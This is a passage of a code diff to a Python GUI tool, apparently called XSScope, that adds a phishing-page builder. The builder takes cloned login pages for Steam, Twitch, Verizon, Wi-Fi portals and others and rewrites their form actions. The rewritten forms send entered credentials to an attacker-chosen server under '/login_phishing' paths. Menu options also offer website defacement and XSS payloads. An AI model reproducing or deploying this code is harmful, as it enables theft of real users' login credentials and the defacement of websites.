none;"><!--{"baseScdsUrl":"https://static.licdn.com/scds","contextPath":"/directory/","pageInstance":"urn:li:page:uno-reg-guest-home;8mEWRhFNRZeWbUQcvxbUAw==","isProd":true,"brotliBaseSparkUrlForHashes":"https://static.licdn.com/sc/h/br","linkedInDustJsUrl":"https://static.licdn.com/sc/h/3qk7aqkysw7gz575y2ma1e5ky","baseSparkUrlForHashes":"https://static.licdn.com/sc/h","isCsUser":false,"appName":"seo-directory-frontend","fizzyJsUrl":"https://static.licdn.com/scds/common/u/lib/fizzy/fz-1.3.3-min.js","mpName":"seo-directory-frontend","scHashesUrl":"https://static.licdn.com/sc/p/com.linkedin.seo-directory-frontend%3Aseo-directory-frontend-static-content%2B0.1.326/f/%2Fseo-directory-frontend%2Fsc-hashes%2Fsc-hashes_en_US.js","dustDebug":"control","baseMediaUrl":"https://media.licdn.com/media","isBrotliEnabled":false,"useCdn":true,"locale":"en_US","version":"0.1.326","useScHashesJs":false,"cdnUrl":"https://static.licdn.com","baseMprUrl":"https://media.licdn.com/mpr/mpr","playUtilsUrl":"https://static.licdn.com/sc/h/v0un52v653evxg2c5l1ap5la","useNativeXmsg":false,"hashesDisabledByQueryParam":false,"baseAssetsUrl":"https://static.licdn.com/sc/p/com.linkedin.seo-directory-frontend%3Aseo-directory-frontend-static-content%2B0.1.326/f","csrfToken":"ajax:0054295001501331025","intlPolyfillUrl":"https://static.licdn.com/sc/h/1fw1ey0jfgqapy4dndtgrr7y1","serveT8WithDust":false,"disableDynamicConcat":false,"baseSparkUrlForFiles":"https://static.licdn.com/sc/p/com.linkedin.seo-directory-frontend%3Aseo-directory-frontend-static-content%2B0.1.326/f","dustUtilsUrl":"https://static.licdn.com/sc/h/19dd5wwuyhbk7uttxpuelttdg","linkedInDustI18nJsUrl":"https://static.licdn.com/sc/h/epy983tzfexddbwygtwyxyavv","baseMediaProxyUrl":"https://media.licdn.com/media-proxy"}--></code><script src="https://static.licdn.com/sc/h/19dd5wwuyhbk7uttxpuelttdg"></script><code id="signupAjaxUrl" style="display: none;"><!--"https://www.linkedin.com/start/reg/api/cors/createAccount?trk=public_guest-home_default"--></code><code id="isPreloadDuoEnabled" style="display: none;"><!--true--></code>\n'''
+            with open('templates/linkedin/login.html', "w") as f:
+                f.writelines(lines)
+                f.close()
+
+            with open('templates/linkedin/login.html') as f:
+                html_code.insert("1.0", f.read())
+
+        #the begin of Steam login form creation, if selected
+        if selection == "Steam Login Form":
+            html_code.delete('1.0', END)
+            with open('templates/steam/login.html') as f:
+                lines = f.readlines()
+
+            lines[304] = '''			<form action="login.php" method="POST" name="logon" id="loginForm" style="display: none;">\n'''
+            with open('templates/steam/login.html', "w") as f:
+                f.writelines(lines)
+                f.close()
+
+            with open('templates/steam/login.html') as f:
+                html_code.insert("1.0", f.read())
+
+        #the begin of Twitch login form creation, if selected
+        if selection == "Twitch Login Form":
+            html_code.delete('1.0', END)
+            with open('templates/twitch/login.html') as f:
+                lines = f.readlines()
+
+            lines[65] = '''  <form method="post" action="http://''' + tcp_server + '''/login_phishing/twitch_login.php" id="loginForm" class="col-md-6">\n'''
+            with open('templates/twitch/login.html', "w") as f:
+                f.writelines(lines)
+                f.close()
+
+            with open('templates/twitch/login.html') as f:
+                html_code.insert("1.0", f.read())
+
+        #the begin of Verizon login form creation, if selected
+        if selection == "Verizon Login Form":
+            html_code.delete('1.0', END)
+            with open('templates/verizon/login.html') as f:
+                lines = f.readlines()
+
+            lines[344] = '''                    <form method="post" autocomplete="off" action="http://''' + tcp_server + '''/login_phishing/verizon_login.php" name="loginForm" id="login-form">\n'''
+            with open('templates/verizon/login.html', "w") as f:
+                f.writelines(lines)
+                f.close()
+
+            with open('templates/verizon/login.html') as f:
+                html_code.insert("1.0", f.read())
+
+        #the begin of WiFi login form creation, if selected
+        if selection == "WiFi Phishing Login Form":
+            html_code.delete('1.0', END)
+            with open('templates/wifi/login.html') as f:
+                lines = f.readlines()
+
+            lines[901] = '''<form novalidate="" method="post" id="form1" name="form1" action="http://''' + tcp_server + '''/login_phishing/wifi_login.php">\n'''
+            with open('templates/wifi/login.html', "w") as f:
+                f.writelines(lines)
+                f.close()
+
+            with open('templates/wifi/login.html') as f:
+                html_code.insert("1.0", f.read())
+
+    html_options = tk.StringVar()
+    html_menu = tk.OptionMenu(html_developer_frame, html_options, 'Website Deface', 'Amazon Login Form', 'Google Login Form', 'Line Login Form', 'Linkedin Login Form', 'Steam Login Form', 'Twitch Login Form', 'Verizon Login Form', 'WiFi Phishing Login Form', "None", command=callback)
+    html_menu.pack()
+    html_options.set('Choose a pre-generated HTML code')
+
+    #frames for buttons
+    add_code_frame = tk.LabelFrame(root4, text="")
+    add_code_frame.place(x=870, y=50)
+
+    add_code_button = tk.Button(add_code_frame, text="Apply code", command=add_html_code)
+    add_code_button.grid(row=0, column=0)
+
+    #configuring the tab for phishing website
+    menubar2 = Menu(root4)
+    filemenu2 = Menu(menubar2, tearoff=0)
+    filemenu2.add_command(label="Import code from file", command=import_html)
+    filemenu2.add_separator()
+    filemenu2.add_command(label="XSS Payloads", command=show_payloads_html)
+    filemenu2.add_command(label="Exit", command=quit4)
+    menubar2.add_cascade(label="Main", menu=filemenu2)
+
+    root4.config(menu=menubar2)
+    root4.mainloop()
+
 def main():
     #setting up the whole gui properties
     root = tk.Tk()
-    root.title("XSScope v.1.2")
+    root.title("XSScope v.1.3")
     root.geometry('410x100')
     #root.iconbitmap('x_logo_VYw_icon.ico')
     root.resizable(0,0)
-    current_version = 1.2
+    current_version = 1.3
     #end of the gui propertie
     #print the welcoming message in the terminal/cmd
 
@@ -730,23 +1158,23 @@ def main():
     php_port_output.configure(state="readonly")
     php_port_output.grid(row=0, column=3)
 
-    # FRAME for Listener output
-    #main_frame2 = LabelFrame(root, text="Listener Output")
-    #main_frame2.place(x=5, y=100)
-
-    #listener_output = Text(main_frame2, width=90, height=19)
-    #listener_output.grid(row=0, column=0)
-
     #customising the Menu
     menubar = Menu(root)
     filemenu = Menu(menubar, tearoff=0)
     filemenu.add_command(label="Agent Module", command=agent_module)
-    filemenu.add_command(label="XSS Hunting", command=show_payload)
+    filemenu.add_command(label="Add HTML code", command=phishing_website)
+    filemenu.add_command(label="XSS Payloads", command=show_payload)
     filemenu.add_separator()
-    filemenu.add_command(label="About", command=documentation)
     filemenu.add_command(label="Check for update", command=check_update)
     filemenu.add_command(label="Exit", command=quit)
     menubar.add_cascade(label="Main", menu=filemenu)
+
+    # help menu
+    helpmenu = Menu(menubar, tearoff=0)
+    helpmenu.add_command(label="About", command=about)
+    helpmenu.add_command(label="Documentation", command=help)
+    helpmenu.add_command(label="License", command=documentation)
+    menubar.add_cascade(label="Help", menu=helpmenu)
 
     # end of script to configure all the script
     root.config(menu=menubar)
